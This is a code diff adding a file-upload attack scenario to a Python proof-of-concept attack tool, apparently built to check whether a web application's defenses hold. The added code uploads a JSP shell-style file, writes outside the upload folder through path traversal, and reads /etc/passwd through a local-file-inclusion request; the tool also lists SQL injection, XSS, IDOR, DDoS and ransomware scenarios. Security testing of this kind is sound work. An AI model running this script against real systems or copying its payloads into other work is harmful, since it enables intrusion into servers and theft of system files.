@@ -264,12 +264,70 @@ def attack_unknown(base, admin_user, admin_pass):
         print(f"\n[RESULT] 🔴 VULNERABLE — 스캐닝 무탐지·정상통과(이상탐지 OFF).")
         return 1
 
+def _upload_multipart(base, tid, tok, filename, content):
+    b = "----airatk" + str(random.randint(10000, 99999))
+    body = (f"--{b}\r\n"
+            f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
+            f"Content-Type: application/octet-stream\r\n\r\n").encode() \
+        + (content.encode() if isinstance(content, str) else content) \
+        + f"\r\n--{b}--\r\n".encode()
+    req = urllib.request.Request(base.rstrip('/') + f"/api/v1/tenants/{tid}/uploads",
+                                 data=body, method='POST')
+    req.add_header('Content-Type', 'multipart/form-data; boundary=' + b)
+    req.add_header('Authorization', 'Bearer ' + tok)
+    try:
+        with urllib.request.urlopen(req, timeout=15) as r:
+            return r.status
+    except urllib.error.HTTPError as e:
+        return e.code
+
+def _upload_download(base, tid, tok, name):
+    path = f"/api/v1/tenants/{tid}/uploads/download?name=" + urllib.parse.quote(name, safe='')
+    req = urllib.request.Request(base.rstrip('/') + path, method='GET')
+    req.add_header('Authorization', 'Bearer ' + tok)
+    try:
+        with urllib.request.urlopen(req, timeout=15) as r:
+            return r.status, r.read().decode(errors='replace')
+    except urllib.error.HTTPError as e:
+        return e.code, e.read().decode(errors='replace')
+
+def attack_upload(base, admin_user, admin_pass):
+    print("=== AIR PoC: 파일 업로드 취약(확장자우회/경로조작/LFI) ===")
+    admin_tok, _ = login(base, admin_user, admin_pass)
+    suffix = f"{int(time.time())}{random.randint(100, 999)}"
+    st, j = call(base, 'POST', '/api/v1/tenants', admin_tok,
+                 {'name': f'atk-{suffix}', 'slug': f'atk-{suffix}'})
+    tid = j['data']['id']
+    print(f"[*] 준비 완료: tenant={tid}")
+
+    vuln = 0
+    st1 = _upload_multipart(base, tid, admin_tok, 'air_shell.jsp', "<% out.println(\"pwn\"); %>")
+    ok1 = st1 in (200, 201); vuln |= ok1
+    print(f"[>] .jsp 업로드 → HTTP {st1} : {'허용(취약)' if ok1 else '차단'}")
+
+    marker = f"AIRPWN{random.randint(100000, 999999)}"
+    trav = "../../../../tmp/air_pwn_" + str(random.randint(1000, 9999)) + ".txt"
+    _upload_multipart(base, tid, admin_tok, trav, marker)
+    _, body2 = _upload_download(base, tid, admin_tok, trav)
+    ok2 = marker in (body2 or ""); vuln |= ok2
+    print(f"[>] 경로조작 쓰기+되읽기 → {'탈출저장(취약)' if ok2 else '차단'}")
+
+    st3, body3 = _upload_download(base, tid, admin_tok, "../../../../../../etc/passwd")
+    ok3 = "root:" in (body3 or ""); vuln |= ok3
+    print(f"[>] LFI(../etc/passwd) → HTTP {st3} : {'노출(취약)' if ok3 else '차단'}")
+
+    if vuln:
+        print("\n[RESULT] 🔴 VULNERABLE — 업로드 검증/경로 방어 부재.")
+        return 1
+    print("\n[RESULT] 🟢 DEFENDED — 업로드 방어 활성(탐지→가드 또는 영구패치).")
+    return 0
+
 def main():
     ap = argparse.ArgumentParser(description="AIR PoC 공격 모듈")
     ap.add_argument('--base', required=True, help='타깃 베이스 URL (예: http://13.125.184.233)')
     ap.add_argument('--admin-user', required=True)
     ap.add_argument('--admin-pass', required=True)
-    ap.add_argument('scenario', choices=['negative-qty', 'sqli', 'xss', 'idor', 'ddos', 'ransom', 'unknown'])
+    ap.add_argument('scenario', choices=['negative-qty', 'sqli', 'xss', 'idor', 'upload', 'ddos', 'ransom', 'unknown'])
     a = ap.parse_args()
     if a.scenario == 'negative-qty':
         sys.exit(attack_negative_qty(a.base, a.admin_user, a.admin_pass))
@@ -279,6 +337,8 @@ def main():
         sys.exit(attack_xss(a.base, a.admin_user, a.admin_pass))
     elif a.scenario == 'idor':
         sys.exit(attack_idor(a.base, a.admin_user, a.admin_pass))
+    elif a.scenario == 'upload':
+        sys.exit(attack_upload(a.base, a.admin_user, a.admin_pass))
     elif a.scenario == 'ddos':
         sys.exit(attack_ddos(a.base, a.admin_user, a.admin_pass))
     elif a.scenario == 'ransom':
